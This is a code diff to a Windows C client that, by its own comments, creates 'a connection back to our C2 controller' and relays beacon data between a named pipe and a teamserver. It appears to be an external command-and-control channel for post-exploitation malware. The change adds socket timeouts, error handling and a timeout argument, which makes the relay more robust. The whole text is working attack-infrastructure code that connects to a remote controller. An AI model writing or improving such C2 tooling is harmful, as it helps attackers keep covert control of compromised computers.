@@ -38,12 +38,16 @@
  * @param port A pointer to an array containing the port to connect on
  * @return A socket handle for the connection
 */
-SOCKET create_socket(char* ip, char* port)
+SOCKET create_socket(char* ip, char* port, int timeout_sec)
 {
 	int iResult;
 	SOCKET ConnectSocket = INVALID_SOCKET;
 	WSADATA wsaData;
 	struct addrinfo* result = NULL, * ptr = NULL, hints;
+
+	struct timeval timeout;      
+    timeout.tv_sec = timeout_sec;
+    timeout.tv_usec = 0;
 
 	// Initialize Winsock
 	iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
@@ -80,6 +84,14 @@ SOCKET create_socket(char* ip, char* port)
 		return INVALID_SOCKET;
 	}
 
+	// Set socket timeout    
+    if (setsockopt (ConnectSocket, SOL_SOCKET, SO_RCVTIMEO, (char *)&timeout,
+                sizeof(timeout)) < 0)
+        debug_print("%s", "setsockopt rcvtimeout failed\n");
+	if (setsockopt (ConnectSocket, SOL_SOCKET, SO_SNDTIMEO, (char *)&timeout,
+                sizeof(timeout)) < 0)
+        debug_print("%s", "setsockopt sndtimeout failed\n");
+
 	// Connect to server.
 	iResult = connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
 	if (iResult == SOCKET_ERROR) {
@@ -106,10 +118,23 @@ SOCKET create_socket(char* ip, char* port)
  * @param sd A socket file descriptor
  * @param data A pointer to an array containing data to send
  * @param len Length of data to send
+ * @return Number of bytes sent
 */
-void sendData(SOCKET sd, const char* data, DWORD len) {
-	send(sd, (char *)&len, 4, 0);
-	send(sd, data, len, 0);
+int sendData(SOCKET sd, const char* data, DWORD len) {
+	int iResult;
+	iResult = send(sd, (char *)&len, 4, 0);
+	if (iResult == SOCKET_ERROR)
+	{
+		debug_print("Recv failed: %d\n", WSAGetLastError());
+		return -1;
+	}
+	iResult = send(sd, data, len, 0);
+	if (iResult == SOCKET_ERROR)
+	{
+		debug_print("Recv failed: %d\n", WSAGetLastError());
+		return -1;
+	}
+	return iResult;
 }
 
 
@@ -123,13 +148,24 @@ void sendData(SOCKET sd, const char* data, DWORD len) {
 */
 DWORD recvData(SOCKET sd, char * buffer, DWORD max) {
 	DWORD size = 0, total = 0, temp = 0;
+	int iResult;
 
 	/* read the 4-byte length */
-	recv(sd, (char *)&size, 4, 0);
+	iResult = recv(sd, (char *)&size, 4, 0);
+	if (iResult == SOCKET_ERROR)
+	{
+		debug_print("Recv failed: %d\n", WSAGetLastError());
+		return -1;
+	}
 
 	/* read in the result */
 	while (total < size) {
 		temp = recv(sd, buffer + total, size - total, 0);
+		if (temp == SOCKET_ERROR)
+		{
+			debug_print("Recv failed: %d\n", WSAGetLastError());
+			return -1;
+		}
 		total += temp;
 	}
 
@@ -181,12 +217,12 @@ void write_frame(HANDLE my_handle, char * buffer, DWORD length) {
 void main(int argc, char* argv[])
 {
 	// Set connection info
-	if (argc != 5)
+	if (argc != 6)
 	{
 		//printf("Incorrect number of args: %d\n", argc);
 		//printf("Incorrect number of args: client.exe [IP] [PORT] [PIPE_STR] [SLEEP]");
 		debug_print("Incorrect number of args: %d\n", argc);
-		debug_print("%s\n", "Incorrect number of args: client.exe [IP] [PORT] [PIPE_STR] [SLEEP]");
+		debug_print("%s\n", "Incorrect number of args: client.exe [IP] [PORT] [PIPE_STR] [SLEEP] [TIMEOUT]");
 		exit(1);
 	}
 
@@ -203,6 +239,9 @@ void main(int argc, char* argv[])
 	int sleep;
 	sleep = atoi(argv[4]);
 
+	int TIMEOUT_SEC;
+	TIMEOUT_SEC = atoi(argv[5]);
+
 	DWORD payloadLen = 0;
 	char* payloadData = NULL;
 	HANDLE beaconPipe = INVALID_HANDLE_VALUE;
@@ -210,7 +249,7 @@ void main(int argc, char* argv[])
 	// Create a connection back to our C2 controller
 	SOCKET sockfd = INVALID_SOCKET;
 
-	sockfd = create_socket(IP, PORT);
+	sockfd = create_socket(IP, PORT, TIMEOUT_SEC);
 	if (sockfd == INVALID_SOCKET)
 	{
 		//printf("Socket creation error!\n");
@@ -281,7 +320,12 @@ void main(int argc, char* argv[])
 			Sleep(sleep*1000);
 		}
 
-		sendData(sockfd, buffer, read_size);
+		int send_size = sendData(sockfd, buffer, read_size);
+		if (send_size < 0)
+		{
+			debug_print("%s", "sendData error, exiting\n");
+			break;
+		}
 		//printf("Sent to TS\n");
 		debug_print("%s", "Sent to TS\n");
 		
